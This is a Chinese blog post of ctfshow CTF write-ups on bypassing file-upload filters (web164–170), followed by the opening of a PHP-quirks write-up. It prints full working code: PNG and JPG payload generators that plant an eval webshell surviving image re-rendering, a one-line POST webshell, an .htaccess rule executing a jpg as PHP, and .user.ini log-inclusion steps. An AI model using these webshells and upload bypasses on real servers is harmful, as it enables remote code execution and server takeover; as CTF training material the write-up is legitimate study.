src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225170512492.png" alt="image-20221225170512492"></p><p>这道题的考点是png图片的二次渲染，就是得在图片里包含我们的php代码，这里图片得用代码来渲染，直接图片和代码合成起来的图片码不行。</p><p>渲染代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;3.png&#x27;</span>); <span class="comment">#保存在本地的图片马</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在phpstudy的www里保存这段代码，并且把一张图片也保存下来，并且命名为自己想要命名的名字。</p><p>如何就去上传这个渲染后的图片码，并且进行抓包查看就行了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225195009472.png" alt="image-20221225195009472"></p><p>成功写入代码并且执行了，然后进行rce就行了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225195105069.png" alt="image-20221225195105069"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这道题是考察png图片的二次渲染，合成的图片码这里行不通。</span><br></pre></td></tr></table></figure><h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225202653862.png" alt="image-20221225202653862"></p><p>这里就是利用的jpg二次渲染，但是这道题好像有点问题，好像得找到特殊的图片才能成功，所以这里教方法就行了。</p><p><strong>jpg渲染代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php echo 123;eval($_POST[0]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用法：  php exp.php a.jpg</span><br></pre></td></tr></table></figure><p>然后就会生成一个渲染后的jpg文件。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225203021359.png" alt="image-20221225203021359"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225203058469.png" alt="image-20221225203058469"></p><p>这是里面的木马。</p><p>然后进行抓包rce就行了。</p><h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225211902666.png" alt="image-20221225211902666"></p><p>这道题是一道zip类型类型的题目，就是上传文件只能上传zip类型的，然后我们就去本地找一张图片，然后就去转化为zip类型并且上传，并且在zip里写入一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>然后就进行上传。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225212120262.png" alt="image-20221225212120262"></p><p>上传成功后就把request 请求改成POST，刚开始我就是这里没改，找了半天问题。</p><p>然后就可以进行rce了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225212238112.png" alt="image-20221225212238112"></p><h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225230535662.png" alt="image-20221225230535662"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231006048.png" alt="image-20221225231006048"></p><p>题目给了这个东西是与.htaccess有关的，所以这道题是得用到.htaccess</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;normal_up.jpg&quot;&gt;</span><br><span class="line">setHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>上面的文件名是，等会要上传的文件。</p><p><strong>第一步</strong></p><p>先上传一个jpg文件，然后把文件名和文件内容全部改掉，文件名改成.htaccess，文件内容改成上面的代码。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231330037.png" alt="image-20221225231330037"></p><p><strong>第二步</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231346882.png" alt="image-20221225231346882"></p><p><strong>第三步</strong></p><p>访问上传图片的地址，然后进行rce</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225231418066.png" alt="image-20221225231418066"></p><h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225233316993.png" alt="image-20221225233316993"></p><p>这道题的坑是在它给的上传目录是没有包含upload的，就是直接访问图片名的话，就是会报错。</p><p>知道这里以后就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接就先上传一个png图片，然后就修改图片内容和后缀就可以了。</span><br></pre></td></tr></table></figure><p>然后访问/upload/图片名    就可进行rce了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225234159992.png" alt="image-20221225234159992"></p><h2 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221225234946679.png" alt="image-20221225234946679"></p><p>这道题把  &lt;   给过滤掉了，那么php脚本的话，必须得包含它，那么我们就得换另一种形式了，就是包含日志，那么包含日志的话，得需要一个前提就是得有默认文件<strong>index.php</strong></p><p>但是这道题没有，那么我们就得进行构造index.php了</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153025708.png" alt="image-20221226153025708"></p><p>成功上传index.php</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153057506.png" alt="image-20221226153057506"></p><p>然后利用.user.ini上传日志包含</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153313062.png" alt="image-20221226153313062"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153332634.png" alt="image-20221226153332634"></p><p>发现测试成功，然后就可以进行读取flag了。</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221226153612103.png" alt="image-20221226153612103"></p><p>这里得进行抓包读取，浏览器查看的话，看不出来。</p><h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><p>源码</p><p><img src="\images\image-20221226153716031.png" alt="image-20221226153716031"></p><p>这题和上一题的解法一模一样，就不多说了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 文件上传 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-PHP特性 刷题记录</title>
      <link href="/posts/94c13720.html"/>
      <url>/posts/94c13720.html</url>
      
        <content type="html"><![CDATA[<h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211029898.png" alt="image-20221218211029898"></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211208944.png" alt="image-20221218211208944"></p><p>利用数组绕过，对num的正则匹配。</p><p>因为    ——&gt;<strong>preg_match只能处理字符串，当传入的subject是数组时会返回false</strong></p><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211321940.png" alt="image-20221218211321940"></p><p>先解释一下<code>intval</code>的意思</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211520421.png" alt="image-20221218211520421"></p><p>然后这道题就可以通过数字加字母绕过。    <strong><!--也可以使用16进制绕过    ---->   num=0x117c—&gt;</strong></p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218211550102.png" alt="image-20221218211550102"></p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><p>源码</p><p><img src="C:\Users\sdbdb\AppData\Roaming\Typora\typora-user-images\image-20221218212029537.png" 